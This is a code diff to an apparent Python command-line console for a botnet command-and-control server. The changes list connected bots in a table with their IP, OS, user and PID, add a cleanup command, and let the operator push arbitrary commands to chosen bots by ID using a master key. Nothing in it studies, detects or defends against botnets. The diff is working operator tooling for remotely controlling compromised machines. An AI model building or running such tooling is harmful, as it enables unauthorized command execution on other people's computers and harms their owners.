@@ -3,12 +3,14 @@ import argparse
 import requests
 import socket 
 import os 
+import re 
 import platform 
 import asyncio
 import threading 
 import json
 import pathlib 
 import time
+import pandas as pd 
 from subprocess import Popen, PIPE
 from multiprocessing.pool import ThreadPool
 
@@ -154,7 +156,6 @@ ___  ___          _              _____                       _
     """
     list_parser = argparse.ArgumentParser()
     list_parser.add_argument('-f', '--find', type=str, help='Find specific agent by ip address')
-    # TBH the result from the server should be in json format, and this CLI should parse the JSON and pretty print. 
     @cmd2.with_category(CUSTOM_CATEGORY)
     #@cmd2.with_argparser()
     def do_list(self, arg):
@@ -170,13 +171,44 @@ ___  ___          _              _____                       _
         data = {'masterkey': MASTERKEY}
         res = requests.post(url, data=data)
 
-        botlist = "==========================================================\n"
-        botlist += res.text
+        if len(res.json()) == 0:
+            self.poutput(ansi.style("No bots connected with this server at the moment", fg='red', bold=True))
 
-        output_botlist = ansi.style(botlist, fg='green', bold=True)
+        else:
+            botlist = res.json()
 
-        self.poutput(output_botlist)
+            pd.set_option("display.colheader_justify","center")
+            df = pd.DataFrame(res.json())
+            df.columns = ['ID','IP','OS','User','PID','Last Seen']
+            df_string = df.to_string(index=False)
+            #print(df_string)
+            #print(type(df_string))
 
+            printoutput = "\n ==================================================================\n"
+            printoutput += df_string
+            printoutput += "\n" 
+            printoutput += " ==================================================================\n"
+
+            output_botlist = ansi.style(printoutput, fg='green', bold=True)
+
+            self.poutput(output_botlist)
+
+    @cmd2.with_category(CUSTOM_CATEGORY)
+    def do_cleanup(self):
+        try:
+            if URL is None:
+                self.poutput('URL is not set!')
+        except Exception as e:
+            output_loginfirst = ansi.style("\n\n!!! Login First !!!\n", fg='red', bg='blue', bold=True)
+            self.poutput(output_loginfirst)
+
+
+        url = URL + '/bot/cleanup'
+        data = {'masterkey': MASTERKEY}
+        res = requests.post(url, data=data)
+
+        output_cleanup = ansi.style(res.text, fg='green', bold=True)
+        self.poutput(output_cleanup)
 
     """
     Command: Commands 
@@ -208,7 +240,7 @@ ___  ___          _              _____                       _
     Description: Push a specific command to specific bot(bots). 
     """
     push_parser = argparse.ArgumentParser()
-    push_parser.add_argument('-t', '--target', type=str, help="Target bot's IP address to push the command")
+    push_parser.add_argument('-t', '--target', type=str, help="Target bot's ID to push the command")
     push_parser.add_argument('-c', '--command', type=str, help='Command to push')
 
     @cmd2.with_category(CUSTOM_CATEGORY)
@@ -218,6 +250,9 @@ ___  ___          _              _____                       _
 
         # Push the command to multiple targets 
         for target in target_list:
+            print("[DEBUG] target = ", target)
+
+
             url = URL + '/bot/' + target + '/push'
             masterkey = MASTERKEY
             cmd = args.command 
